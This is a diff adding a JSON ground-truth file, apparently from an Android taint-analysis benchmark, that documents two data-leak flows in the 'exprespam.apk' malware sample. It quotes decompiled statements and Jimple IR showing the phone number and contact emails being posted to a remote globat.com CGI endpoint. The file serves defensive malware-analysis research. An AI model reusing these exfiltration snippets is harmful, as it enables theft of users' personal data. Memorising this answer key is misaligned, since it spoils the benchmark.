@@ -1,0 +1,154 @@
+{
+  "fileName": "exprespam.apk",
+  "day": "2019-10-17",
+  "findings": [
+    {
+      "source": {
+        "statement": "String line1Number = ((TelephonyManager) WrehifsdkjsActivity.this.getSystemService(\"phone\")).getLine1Number();",
+        "methodName": "public void run()",
+        "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+        "lineNo": 51,
+        "targetName": "getLine1Number",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<android.telephony.TelephonyManager: java.lang.String getLine1Number()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse response = client.execute(method);",
+        "methodName": "public String doPost(String url, String params)",
+        "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+        "lineNo": 120,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = virtualinvoke $r3.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r5)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String result = doPost(\"https://ftukguhilcom.globat.com/cgi-bin/confirmUserData.php\", \"t=\" + line1Number + \"&app=Wrehifsdkjs\");",
+          "methodName": "public void run()",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 61,
+          "ID": 1
+        },
+        {
+          "statement": "HttpPost method = new HttpPost(url);",
+          "methodName": "public String doPost(String url, String params)",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 111,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow leaks the telephone number  to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Cursor emails = WrehifsdkjsActivity.this.managedQuery(Email.CONTENT_URI, null, \"contact_id = \" + id, null, null);",
+        "methodName": "public ArrayList<String> getAddress()",
+        "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+        "lineNo": 156,
+        "targetName": "managedQuery",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r3.<frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity: android.database.Cursor managedQuery(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r1, null, $r5, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse response = client.execute(method);",
+        "methodName": "public String doPost(String url, String params)",
+        "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+        "lineNo": 120,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = virtualinvoke $r3.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r5)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "strContact = new StringBuilder(String.valueOf(strContact)).append(emails.getString(emails.getColumnIndex(\"data1\"))).append(\"\\n\").toString();",
+          "methodName": "public ArrayList<String> getAddress()",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 160,
+          "ID": 1
+        },
+        {
+          "statement": "strContacts.add(new StringBuilder(String.valueOf(strContact)).append(\"\\\"\").toString().replaceAll(\"&\", \"＆\"));",
+          "methodName": "public ArrayList<String> getAddress()",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 149,
+          "ID": 2
+        },
+        {
+          "statement": "return strContacts;",
+          "methodName": "public ArrayList<String> getAddress()",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 166,
+          "ID": 3
+        },
+        {
+          "statement": "Iterator<String> it = getAddress().iterator();",
+          "methodName": "public void run()",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 87,
+          "ID": 4
+        },
+        {
+          "statement": "address = new StringBuilder(String.valueOf(address)).append((String) it.next()).append(\"\\n\").toString();",
+          "methodName": "public void run()",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 77,
+          "ID": 5
+        },
+        {
+          "statement": "doPost(\"https://ftukguhilcom.globat.com/cgi-bin/registerAddressData.php\", \"data=\" + address + \"&t=\" + line1Number + \"&app=Wrehifsdkjs\");",
+          "methodName": "public void run()",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 92,
+          "ID": 6
+        },
+        {
+          "statement": "StringEntity paramEntity = new StringEntity(params, \"UTF-8\");",
+          "methodName": "public String doPost(String url, String params)",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 116,
+          "ID": 7
+        },
+        {
+          "statement": "method.setEntity(paramEntity);",
+          "methodName": "public String doPost(String url, String params)",
+          "className": "frhfsd.siksdk.ujdsfjkfsd.WrehifsdkjsActivity.Progress",
+          "lineNo": 119,
+          "ID": 8
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "collections": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious flow leaks contact data to a remote server.",
+      "isNegative": false
+    }
+  ]
+}
